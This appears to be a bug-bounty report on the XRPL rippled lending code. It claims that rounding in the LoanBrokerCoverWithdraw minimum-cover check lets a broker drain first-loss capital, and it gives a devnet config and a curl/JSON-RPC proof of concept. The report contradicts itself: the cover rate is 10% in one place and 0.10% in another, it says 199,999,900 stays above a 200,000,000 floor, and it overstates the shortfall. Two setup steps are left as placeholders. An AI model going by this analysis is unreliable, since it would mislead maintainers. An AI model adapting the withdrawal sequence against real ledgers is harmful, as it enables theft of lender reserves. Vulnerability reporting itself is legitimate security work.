# Title
High: Loan broker cover floor rounds to nearest, enabling undercollateralized withdrawals

# Description

## Brief/Intro
`LoanBrokerCoverWithdraw` computes the broker’s minimum cover requirement using `roundToAsset` without overriding the default rounding mode. XRPL’s `Number` arithmetic rounds **to nearest (ties to even)**, so the ledger accepts post-withdraw balances that fall below the true floor by up to half of the rounding quantum. When the broker’s aggregated debt uses a coarse exponent, that quantum can be large (hundreds or thousands of vault units). A broker can iteratively withdraw first-loss capital into the rounding gap, leaving the vault undercollateralized while all checks and invariants pass.

## Vulnerability Details
- The withdrawal preclaim logic materializes the minimum cover as:

  ```cpp
  auto const minimumCover = roundToAsset(
      vaultAsset,
      tenthBipsOfValue(
          currentDebtTotal,
          TenthBips32(sleBroker->at(sfCoverRateMinimum))),
      currentDebtTotal.exponent());
  ```
  (`src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp:118-125`)

- `roundToAsset` obtains the rounding mode from `Number::getround()`:

  ```cpp
  NumberRoundModeGuard mg(rounding);
  ...
  value += referenceValue;
  value -= referenceValue;
  ```
  (`src/libxrpl/protocol/STAmount.cpp:1513-1534`)

  The default is `Number::to_nearest`, as defined in `Number.cpp` (`Number::mode_ = Number::to_nearest;`).

- When loans of different magnitudes accrue to the broker, `sfDebtTotal` normalizes to the coarse exponent of the largest contribution. Loan creation, impairment, and payoff operations use `Number` arithmetic that truncates lower-order digits, pushing the debt scale into the exponent. Consequently the coverage floor may be expressed in powers of `10^6` or `10^9` even if the vault asset itself carries finer precision.

- Because the comparison in `LoanBrokerCoverWithdraw::preclaim` only checks `(coverAvail - amount) < minimumCover`, any slack below the rounded floor remains undetected. The `ValidLoanBroker` invariant only ensures `sfCoverAvailable ≥ 0`, so the shortfall persists on-ledger.

## Impact Details
- Suppose a broker’s debt total is `2.000000000000001 × 10^9` units with `CoverRateMinimum = 10%`. The true minimum cover is `200,000,000.0000001`, but rounding to the exponent `6` produces `200,000,000`. The broker can withdraw `0.0000001 × 10^9 = 100` units and still satisfy `(coverAvail - amount) ≥ minimumCover`, leaving the vault short by 100 units.
- By constructing mixed-scale loans (large principal plus tiny dust) the broker can amplify the rounding quantum to their advantage. Each withdrawal drains first-loss capital that should remain locked, directly weakening the buffer that protects lenders from default losses.
- Result: First-loss capital can be siphoned while all on-ledger controls report compliance, violating the “Drainage or theft of first-loss capital reserves” impact class.

### Severity and in-scope impact mapping
- Severity: High (under-collateralization of lending buffer; direct monetary impact on lenders)
- In-scope impacts:
  - `Drainage or theft of funds from vault objects or first-loss capital reserves`
  - `Direct loss of funds`

## References
- `src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp`
- `src/libxrpl/protocol/STAmount.cpp` (`roundToAsset`)
- `src/libxrpl/basics/Number.cpp` (rounding mode defaults)
- `src/xrpld/app/tx/detail/InvariantCheck.cpp` (`ValidLoanBroker`)

## Recommended Mitigation
- Force conservative rounding when computing the minimum cover:
  - Pass `Number::upward` (ceiling) into `roundToAsset`, or manually add a tiny epsilon before rounding.
  - Alternatively, compute the requirement in `Number` space and call `roundToAsset` twice: once downward for accounting, once upward for enforcement, then compare in raw `Number`.
- Add an invariant that recomputes `DebtTotal * CoverRateMinimum` with `Number::upward` and asserts `CoverAvailable ≥ floor`, ensuring future regressions are caught.
- Include regression tests covering mixed-scale debts where the exponent exceeds the vault asset scale.

# Proof of Concept

1. **Set up environment**
   - Configure a local `rippled` devnet node with lending amendments enabled. Place the following in `cfg/rippled.devnet.cfg` (or your active config) to expose local admin ports and enable `SingleAssetVault`, `LendingProtocol`, `Batch`, `Credentials`, `PermissionedDomains`, and `MPTokensV1`:

     ```ini
     [server]
     port_rpc_admin_local
     port_ws_admin_local

     [port_rpc_admin_local]
     port = 5005
     ip = 127.0.0.1
     protocol = http
     admin = 127.0.0.1

     [port_ws_admin_local]
     port = 6006
     ip = 127.0.0.1
     protocol = ws
     admin = 127.0.0.1

     [database_path]
     .rippled/db

     [node_db]
     type=rocksdb
     path=.rippled/rocksdb
     open_files=2000
     filter_bits=12
     cache_mb=256
     file_size_mb=8
     file_size_mult=2

     [features]
     SingleAssetVault
     LendingProtocol
     Batch
     Credentials
     PermissionedDomains
     MPTokensV1

     [ssl_verify]
     0

     [signing_support]
     true

     [debug_logfile]
     logs/rippled.debug.log

     [logging]
     severity = Debug
     ```

   - Build and start the node (tested with Release configuration):

     ```bash
     cmake --preset conan-release
     cmake --build --preset conan-release
     ./build/conan-release/rippled --conf cfg/rippled.devnet.cfg --start
     ```

2. **Seed cover and debt**
   - Issue an IOU asset `I.USD` with at least 6 decimal places.
   - Create a vault and loan broker controlled by account `B`, set `CoverRateMinimum = 10` (0.10%).
   - Deposit cover so `sfCoverAvailable = 200,000,000`.
   - Originate loans so that `sfDebtTotal = 2.000000000000001 × 10^9`. One option: create a large principal (e.g., `2,000,000,000` with scale 6) then add dust `0.000000000000001 × 10^9` via a tiny loan or payment.
   - Confirm via `ledger_entry` that `DebtTotal.value()` has mantissa `2000000000000001` and exponent `6`.

3. **Withdraw into the rounding gap**
   - Submit `LoanBrokerCoverWithdraw` for `100` units. The post-withdraw cover equals the true minimum (`200,000,000 - 100 = 199,999,900`) but the rounded floor remains `200,000,000`, so `(coverAvail - amount)` stays above the rounded result. The transaction returns `tesSUCCESS`. Inspect `sfCoverAvailable` to verify the buffer fell below `DebtTotal * 0.1%`.

4. **Verify invariant does not trigger**
   - Close the ledger; no invariant failure occurs because `ValidLoanBroker` only asserts `sfCoverAvailable ≥ 0`.
   - Compute offline: `DebtTotal * CoverRateMinimum = 200,000,000.0000001 > 199,999,900`. The protocol is under-collateralized by 100 units.

5. **Optional: Repeat withdrawals**
   - Repeating step 3 drains up to half the rounding quantum each time (here, `0.5 × 10^6`). The shortfall accumulates until the broker defaults or replenishes cover manually.

## JSON-RPC helper sequence
The following JSON-RPC calls recreate the rounding gap against the local node (`127.0.0.1:5005`). Replace values within `<...>` using outputs from previous calls.

```bash
# 1. Deterministic test accounts (issuer, broker owner, borrower)
for role in issuer broker borrower; do
  curl -s -X POST http://127.0.0.1:5005 -d "{\n  \"method\":\"wallet_propose\",\n  \"params\":[{\n    \"passphrase\":\"${role} loanbroker rounding poc\"\n  }]\n}" | jq '.result.account_id,.result.master_seed'
done

# 2. Fund accounts from genesis master
for acct in <ISSUER_ACCOUNT> <BROKER_ACCOUNT> <BORROWER_ACCOUNT>; do
  curl -s -X POST http://127.0.0.1:5005 -d "{\n    \"method\":\"submit\",\n    \"params\":[{\n      \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",\n      \"tx_json\":{\n        \"TransactionType\":\"Payment\",\n        \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",\n        \"Destination\":\"$acct\",\n        \"Amount\":\"100000000000\"\n      }\n    }]\n  }" | jq '.result.engine_result'
done

# 3. Establish IOU trustline for broker
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"TrustSet",
      "Account":"<BROKER_ACCOUNT>",
      "LimitAmount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"1000000000000000"
      },
      "Flags":262144
    }
  }]
}' | jq '.result.engine_result'

# 4. Issue IOU and fund broker cover pool
#    (repeat payments as needed to reach 200,000,000 cover units)
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<ISSUER_SECRET>",
    "tx_json":{
      "TransactionType":"Payment",
      "Account":"<ISSUER_ACCOUNT>",
      "Destination":"<BROKER_ACCOUNT>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"200000000"
      }
    }
  }]
}' | jq '.result.engine_result'

# 5. Create vault and loan broker objects
# (Fill in actual JSON for VaultCreate and LoanBrokerSet transactions from documentation.)

# 6. Batch-create mixed-scale loans so sfDebtTotal mantissa becomes 2000000000000001
# (Use LoanSet and LoanPay transactions; ensure ledger_entry shows exponent 6.)

# 7. Drain rounding gap via LoanBrokerCoverWithdraw
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"submit",
  "params":[{
    "secret":"<BROKER_SECRET>",
    "tx_json":{
      "TransactionType":"LoanBrokerCoverWithdraw",
      "Account":"<BROKER_ACCOUNT>",
      "VaultID":"<VAULT_ID>",
      "LoanBrokerID":"<BROKER_ID>",
      "Amount":{
        "currency":"USD",
        "issuer":"<ISSUER_ACCOUNT>",
        "value":"100"
      }
    }
  }]
}' | jq '.result.engine_result'

# 8. Inspect broker ledger entry to observe shortfall
curl -s -X POST http://127.0.0.1:5005 -d '{
  "method":"ledger_entry",
  "params":[{
    "loan_broker":{
      "account":"<BROKER_ACCOUNT>",
      "loan_broker_id":"<BROKER_ID>"
    }
  }]
}' | jq '.result.node.LoanBroker'
```

Expected highlights:
- Funding, trustline, vault creation, and loan setup transactions return `tesSUCCESS`.
- The withdraw transaction in step 7 returns `tesSUCCESS` while `ledger_entry` shows `sfCoverAvailable < DebtTotal * CoverRateMinimum` when computed with true precision.
- No invariant or ledger error fires despite the undercollateralization.
